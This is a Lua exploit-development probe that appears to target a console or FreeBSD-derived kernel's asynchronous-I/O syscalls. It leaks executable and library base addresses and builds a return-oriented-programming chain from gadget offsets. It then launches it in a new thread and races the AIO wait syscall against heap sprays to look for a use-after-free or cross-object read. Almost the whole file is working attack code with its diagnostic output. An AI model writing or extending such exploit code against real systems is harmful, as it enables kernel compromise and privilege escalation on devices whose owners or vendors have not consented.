-- CRASH_CLASS: HIGH
-- PROBE 541d: aio_multi_wait(663) race — does wait have swap revalidation?
--
-- 541a/541b: cancel(666) has NO revalidation. Delete(662) DOES.
-- Question: does wait(663) have revalidation?
--
-- Wait is different from cancel: it doesn't abort I/O, it waits for
-- completion and returns the result. If wait operates on a slot that
-- was reclaimed by spray, it could:
--   (a) Return the spray request's result → info leak (spray fd, data)
--   (b) Block waiting for the spray request to complete
--   (c) Write "waited" state into the spray request's metadata
--   (d) Return 0x80020010 like delete → revalidation present
--
-- Strategy: same 540b stagger technique. Submit urandom reads (complete
-- fast) as originals. Race: wait from ROP child, spray creates from Lua.
-- If wait returns the spray request's state, that's cross-object read.
-- We also test with in-flight originals (socketpair blocking reads)
-- to see if wait on an in-flight slot reclaimed by a completed spray
-- returns the spray's completed result.

print("=== PROBE 541d: AIO WAIT RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end

local Z = uint64(0)
local sc20 = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc455 = make_syscall(455)
local sc240 = make_syscall(240)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local sc662 = make_syscall(662)
local sc663 = make_syscall(663)
local sc670 = make_syscall(670)
local sc135 = make_syscall(135)

local pid = to_num(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret     = eb + uint64(0x992)
local pop_rdi_ret     = eb + uint64(0xC9DFE)
local pop_rsi_ret     = eb + uint64(0xD77D)
local pop_rdx_ret     = eb + uint64(0x3B02D7)
local pop_rcx_ret     = eb + uint64(0xE64)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret        = eb + uint64(0x42)
local fn_addr         = lk + uint64(0xB57)

-- ============================================================
-- [A] Init
-- ============================================================
print("[A] init")
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

local urand_path = memory.alloc(16)
write_string(urand_path, "/dev/urandom\0")
local ok_o, urand_fd = pcall(function()
    return make_syscall(5)(uint64(to_num(urand_path)), Z, Z)
end)
urand_fd = ok_o and to_num(urand_fd) or -1
print("  urandom=" .. urand_fd)

-- ============================================================
-- PART 1: Wait race on COMPLETED requests (urandom, fast)
-- Same technique as 541a but with 663 instead of 666
-- ============================================================
print("")
print("========== PART 1: WAIT ON COMPLETED ==========")

local NUM_IDS = 32
local NOP_PAD = 8
local SPRAY_PER_ID = 4

local spray_data_bufs = {}
local spray_res_bufs = {}
for i = 1, NUM_IDS * SPRAY_PER_ID do
    spray_data_bufs[i] = memory.alloc(32)
    spray_res_bufs[i] = memory.alloc(16)
    for j = 0, 28, 4 do wd(spray_data_bufs[i] + j, 0xDEAD0000 + i) end
    wd(spray_res_bufs[i], 0)
end

local reqs_buf = memory.alloc(0x30)
local ids_out  = memory.alloc(8)

local function aio_submit_read(fd, data_buf, res_buf)
    zero(reqs_buf, 0x28)
    wq(reqs_buf + 0x08, uint64(16))
    wq(reqs_buf + 0x10, uint64(to_num(data_buf)))
    wq(reqs_buf + 0x18, uint64(to_num(res_buf)))
    wd(reqs_buf + 0x20, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(to_num(reqs_buf)), uint64(1), uint64(1), uint64(to_num(ids_out)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(ids_out) or 0)
end

local function aio_submit_one(fd)
    local db = memory.alloc(32)
    local rb = memory.alloc(16)
    return aio_submit_read(fd, db, rb)
end

local function aio_poll_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc664(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)), Z)
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function aio_delete_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc662(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function make_tcb()
    local ok_t, p = pcall(function()
        return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

-- Shared memory
local ok_sh, shared = pcall(function()
    return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
zero(shared, 0x2000)

-- Submit urandom reads (complete fast)
print("[B1] Submit urandom reads")
local orig_ids = {}
local ok_count = 0
for i = 1, NUM_IDS do
    local rv, id = aio_submit_one(urand_fd)
    if rv == 0 and id > 0 then
        ok_count = ok_count + 1
        orig_ids[ok_count] = id
    end
end
print(string.format("  created=%d", ok_count))

-- Brief pause to ensure completion
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))
pcall(function() sc240(uint64(to_num(ts)), Z) end)

-- Write IDs to shared memory
-- For wait(663): 663(ids_ptr, count, out_ptr, timeout_ptr, flags?)
-- timeout_ptr must point to {tv_sec=0, tv_nsec=0} for non-blocking.
-- NULL timeout = block forever (like select). We store the zero
-- timespec at shared+0x900 where the child can read it.
zero(shared, 0x2000)
-- Zero timespec at shared+0x900
wq(shared + 0x900, Z)    -- tv_sec = 0
wq(shared + 0x908, Z)    -- tv_nsec = 0
for i = 1, ok_count do
    wd(shared + 0x410 + (i-1) * 4, orig_ids[i])
    wd(shared + 0x010 + (i-1) * 4, 0x77777777)  -- wait output
end

-- Build waiter ROP chain
-- 663(ids_ptr, count=1, out_ptr, timeout=0, flags=0)
-- 5 args: rdi=ids, rsi=1, rdx=out, rcx=0(timeout), r8=0(flags)
-- We don't have pop_r8 — pass 0 and hope the kernel doesn't read garbage.
-- Actually from 397a, 663 worked with just 5 args passed as (ids, 1, out, 0, 0).
-- But ROP only controls 4 regs (rdi,rsi,rdx,rcx). The 5th arg (r8) is whatever
-- is in r8 at the time. For safety, we set rcx=0 (NULL timeout = no wait, just poll).
local function build_waiter(count)
    local map_size = 0x400000
    local ok_m, base = pcall(function()
        return sc_mmap(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = to_num(base)
    local tcb = make_tcb()
    local mid = base_n + (map_size / 2)
    local write_pos = mid - 8
    local offset = 0
    local function emit(v) wq(uint64(write_pos + offset), v); offset = offset + 8 end

    -- sysarch(SET_FSBASE=129)
    emit(pop_rax_ret); emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb)
    emit(fn_addr)

    -- 20 NOPs startup delay
    for pad = 1, 20 do
        emit(pop_rax_ret); emit(uint64(20))
        emit(pop_rdi_ret); emit(Z)
        emit(fn_addr)
    end

    -- For each ID: 663(ids_ptr, 1, out_ptr, timeout_ptr)
    -- 4 args via ROP: rdi, rsi, rdx, rcx
    -- timeout_ptr → shared+0x900 = {0, 0} = instant return
    local shared_n = to_num(shared)
    local timeout_ptr = uint64(shared_n + 0x900)
    for i = 0, count - 1 do
        local id_addr = uint64(shared_n + 0x410 + i * 4)
        local st_addr = uint64(shared_n + 0x010 + i * 4)

        emit(pop_rax_ret); emit(uint64(663))
        emit(pop_rdi_ret); emit(id_addr)
        emit(pop_rsi_ret); emit(uint64(1))
        emit(pop_rdx_ret); emit(st_addr)
        emit(pop_rcx_ret); emit(timeout_ptr)  -- {0,0} = non-blocking
        emit(fn_addr)

        -- NOP padding
        for p = 1, NOP_PAD do
            emit(pop_rax_ret); emit(uint64(20))
            emit(pop_rdi_ret); emit(Z)
            emit(fn_addr)
        end
    end

    -- Write done count
    emit(pop_rax_ret); emit(uint64(count))
    emit(pop_rdi_ret); emit(uint64(shared_n + 4))
    emit(mov_rdi_rax_ret)

    -- thr_exit
    emit(pop_rax_ret); emit(uint64(431))
    emit(pop_rdi_ret); emit(Z)
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(map_size / 2 + 8))
    return tp, offset
end

print(string.format("[C1] Race: %d completed ids, spray=%dx, wait(663)", ok_count, SPRAY_PER_ID))

local tp, csz = build_waiter(ok_count)
print(string.format("  chain=%dB launching...", csz))

pcall(function() sc455(uint64(to_num(tp)), uint64(0x38)) end)

-- Spray
local spray_ids_p1 = {}
local spray_count_p1 = 0
for s = 1, ok_count * SPRAY_PER_ID do
    local idx = s
    if idx <= #spray_data_bufs then
        local rv, id = aio_submit_read(urand_fd, spray_data_bufs[idx], spray_res_bufs[idx])
        if rv == 0 and id > 0 then
            spray_count_p1 = spray_count_p1 + 1
            spray_ids_p1[spray_count_p1] = {id = id, buf_idx = idx}
        end
    end
end
print(string.format("  spray=%d", spray_count_p1))

-- Wait for child
wq(ts, uint64(3)); wq(ts + 8, Z)
for w = 1, 15 do
    if (safe_rd(shared + 4) or 0) > 0 then break end
    pcall(function() sc240(uint64(to_num(ts)), Z) end)
end
local child_done = safe_rd(shared + 4) or 0
print(string.format("  child_done=%d", child_done))

-- Analyze wait statuses
local swap_count = 0
local status_map = {}
for i = 0, ok_count - 1 do
    local st = safe_rd(to_num(shared) + 0x010 + i * 4) or 0
    local key = string.format("0x%08X", st)
    status_map[key] = (status_map[key] or 0) + 1
    if st == 0x80020010 then swap_count = swap_count + 1 end
end
print(string.format("  swaps(0x80020010)=%d/%d", swap_count, ok_count))
print("  wait status distribution:")
for k, v in pairs(status_map) do
    print(string.format("    %s x%d", k, v))
end

-- Verify spray health
print("")
print("[D1] Spray health (part 1)")
wq(ts, uint64(1)); wq(ts + 8, Z)
pcall(function() sc240(uint64(to_num(ts)), Z) end)

local p1_poll_ok, p1_poll_weird = 0, 0
local p1_del_ok, p1_del_weird = 0, 0
local p1_data_ok, p1_data_sentinel = 0, 0

for i = 1, spray_count_p1 do
    local entry = spray_ids_p1[i]
    local id = entry.id
    local buf_idx = entry.buf_idx

    local p_rv, p_st = aio_poll_one(id)
    if p_rv == 0 and (p_st == 3 or p_st == 0x10003) then
        p1_poll_ok = p1_poll_ok + 1
    else
        p1_poll_weird = p1_poll_weird + 1
        if p1_poll_weird <= 3 then
            print(string.format("  POLL WEIRD: id=0x%X st=0x%X", id, p_st))
        end
    end

    local d0 = safe_rd(spray_data_bufs[buf_idx]) or 0
    if d0 == (0xDEAD0000 + buf_idx) then
        p1_data_sentinel = p1_data_sentinel + 1
    else
        p1_data_ok = p1_data_ok + 1
    end

    local d_rv, d_st = aio_delete_one(id)
    if d_rv == 0 and d_st == 0 then
        p1_del_ok = p1_del_ok + 1
    else
        p1_del_weird = p1_del_weird + 1
    end
end
print(string.format("  poll: ok=%d weird=%d", p1_poll_ok, p1_poll_weird))
print(string.format("  data: urandom=%d sentinel=%d", p1_data_ok, p1_data_sentinel))
print(string.format("  delete: ok=%d weird=%d", p1_del_ok, p1_del_weird))

-- Clean up part 1 originals
for i = 1, ok_count do pcall(function() aio_delete_one(orig_ids[i]) end) end

-- ============================================================
-- PART 2: Wait race on IN-FLIGHT requests (socketpair reads)
-- This is the interesting case: wait on a pending request whose
-- slot was reclaimed by a completed spray request. Does wait
-- return the spray's completed result?
-- ============================================================
print("")
print("========== PART 2: WAIT ON IN-FLIGHT ==========")

local NUM_IDS2 = 32

-- Create socketpairs
local read_fds = {}
local write_fds = {}
local sv_buf = memory.alloc(8)
for i = 1, NUM_IDS2 do
    wd(sv_buf, 0xFFFFFFFF); wd(sv_buf + 4, 0xFFFFFFFF)
    local ok_sp, rv_sp = pcall(function()
        return sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv_buf)))
    end)
    local fd0 = safe_rd(sv_buf) or -1
    local fd1 = safe_rd(sv_buf + 4) or -1
    if ok_sp and to_num(rv_sp) == 0 and fd0 >= 0 and fd1 >= 0 then
        read_fds[i] = fd0; write_fds[i] = fd1
    else
        read_fds[i] = -1; write_fds[i] = -1
    end
end

local good_pairs = 0
for i = 1, NUM_IDS2 do if read_fds[i] >= 0 then good_pairs = good_pairs + 1 end end
print(string.format("  socketpairs=%d/%d", good_pairs, NUM_IDS2))

if good_pairs < 8 then
    print("TOO FEW SOCKETPAIRS")
else
    -- Re-init spray buffers
    for i = 1, NUM_IDS2 * SPRAY_PER_ID do
        for j = 0, 28, 4 do wd(spray_data_bufs[i] + j, 0xDEAD0000 + i) end
        wd(spray_res_bufs[i], 0)
    end

    -- Submit blocking reads
    print("[B2] Submit blocking AIO reads")
    local orig2_ids = {}
    local ok2 = 0
    for i = 1, NUM_IDS2 do
        if read_fds[i] >= 0 then
            local db = memory.alloc(32)
            local rb = memory.alloc(16)
            for j = 0, 28, 4 do wd(db + j, 0xAAAA0000 + i) end
            wd(rb, 0)
            local rv, id = aio_submit_read(read_fds[i], db, rb)
            if rv == 0 and id > 0 then
                ok2 = ok2 + 1
                orig2_ids[ok2] = id
            end
        end
    end
    print(string.format("  submitted=%d", ok2))

    -- Confirm pending
    local pend = 0
    for i = 1, ok2 do
        local _, st = aio_poll_one(orig2_ids[i])
        if st ~= 3 and st ~= 0x10003 then pend = pend + 1 end
    end
    print(string.format("  pending=%d/%d", pend, ok2))

    if pend == 0 then
        print("NO PENDING — skip part 2")
    else
        -- Race
        print(string.format("[C2] Race: %d pending, spray=%dx, wait(663)", ok2, SPRAY_PER_ID))

        zero(shared, 0x2000)
        wq(shared + 0x900, Z)    -- tv_sec = 0
        wq(shared + 0x908, Z)    -- tv_nsec = 0
        for i = 1, ok2 do
            wd(shared + 0x410 + (i-1) * 4, orig2_ids[i])
            wd(shared + 0x010 + (i-1) * 4, 0x77777777)
        end

        local tp2, csz2 = build_waiter(ok2)
        print(string.format("  chain=%dB launching...", csz2))

        pcall(function() sc455(uint64(to_num(tp2)), uint64(0x38)) end)

        -- Spray
        local spray2 = {}
        local sc2 = 0
        for s = 1, ok2 * SPRAY_PER_ID do
            if s <= #spray_data_bufs then
                local rv, id = aio_submit_read(urand_fd, spray_data_bufs[s], spray_res_bufs[s])
                if rv == 0 and id > 0 then
                    sc2 = sc2 + 1
                    spray2[sc2] = {id = id, buf_idx = s}
                end
            end
        end
        print(string.format("  spray=%d", sc2))

        -- Wait for child (longer timeout — wait might block)
        wq(ts, uint64(5)); wq(ts + 8, Z)
        for w = 1, 10 do
            if (safe_rd(shared + 4) or 0) > 0 then break end
            pcall(function() sc240(uint64(to_num(ts)), Z) end)
        end
        local cd2 = safe_rd(shared + 4) or 0
        print(string.format("  child_done=%d", cd2))

        if cd2 == 0 then
            print("  *** CHILD DID NOT FINISH — wait(663) may be BLOCKING on in-flight ***")
        end

        -- Analyze wait statuses
        local sw2 = 0
        local sm2 = {}
        for i = 0, ok2 - 1 do
            local st = safe_rd(to_num(shared) + 0x010 + i * 4) or 0
            local key = string.format("0x%08X", st)
            sm2[key] = (sm2[key] or 0) + 1
            if st == 0x80020010 then sw2 = sw2 + 1 end
        end
        print(string.format("  swaps(0x80020010)=%d/%d", sw2, ok2))
        print("  wait status distribution:")
        for k, v in pairs(sm2) do
            print(string.format("    %s x%d", k, v))
        end

        -- Verify spray health
        print("")
        print("[D2] Spray health (part 2)")
        wq(ts, uint64(1)); wq(ts + 8, Z)
        pcall(function() sc240(uint64(to_num(ts)), Z) end)

        local p2_poll_ok, p2_poll_weird = 0, 0
        local p2_del_ok, p2_del_weird = 0, 0
        local p2_states = {}

        for i = 1, sc2 do
            local entry = spray2[i]
            local p_rv, p_st = aio_poll_one(entry.id)
            local key = string.format("0x%X", p_st)
            p2_states[key] = (p2_states[key] or 0) + 1
            if p_rv == 0 and (p_st == 3 or p_st == 0x10003) then
                p2_poll_ok = p2_poll_ok + 1
            else
                p2_poll_weird = p2_poll_weird + 1
            end

            local d_rv, d_st = aio_delete_one(entry.id)
            if d_rv == 0 and d_st == 0 then
                p2_del_ok = p2_del_ok + 1
            else
                p2_del_weird = p2_del_weird + 1
            end
        end
        print(string.format("  poll: ok=%d weird=%d", p2_poll_ok, p2_poll_weird))
        print(string.format("  delete: ok=%d weird=%d", p2_del_ok, p2_del_weird))
        print("  spray states:")
        for k, v in pairs(p2_states) do
            print(string.format("    %s x%d", k, v))
        end

        -- Original states
        print("")
        print("[E2] Original states post-wait-race")
        local o2_states = {}
        for i = 1, ok2 do
            local _, st = aio_poll_one(orig2_ids[i])
            local key = string.format("0x%X", st)
            o2_states[key] = (o2_states[key] or 0) + 1
        end
        for k, v in pairs(o2_states) do
            print(string.format("  %s x%d", k, v))
        end
    end

    -- Cleanup socketpairs
    for i = 1, NUM_IDS2 do
        if read_fds[i] >= 0 then pcall(function() make_syscall(6)(uint64(read_fds[i])) end) end
        if write_fds[i] >= 0 then pcall(function() make_syscall(6)(uint64(write_fds[i])) end) end
    end
end

-- ============================================================
-- [F] Final health check
-- ============================================================
print("")
print("[F] Health check")
local h_rv, h_id = aio_submit_one(urand_fd)
if h_rv == 0 and h_id > 0 then
    wq(ts, uint64(0)); wq(ts + 8, uint64(100000000))
    pcall(function() sc240(uint64(to_num(ts)), Z) end)
    local h_prv, h_pst = aio_poll_one(h_id)
    local h_drv, h_dst = aio_delete_one(h_id)
    local h_drv2, h_dst2 = aio_delete_one(h_id)
    print(string.format("  create=0x%X poll=%d/%X del=%d/%X del2=%d/%X",
        h_id, h_prv, h_pst, h_drv, h_dst, h_drv2, h_dst2))
    if h_pst == 3 and h_dst == 0 and h_dst2 == 0x80020003 then
        print("  HEALTHY")
    else
        print("  *** UNHEALTHY ***")
    end
else
    print("  CREATE FAILED rv=" .. h_rv)
end

print("")
local pid2 = to_num(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 541d DONE ===")
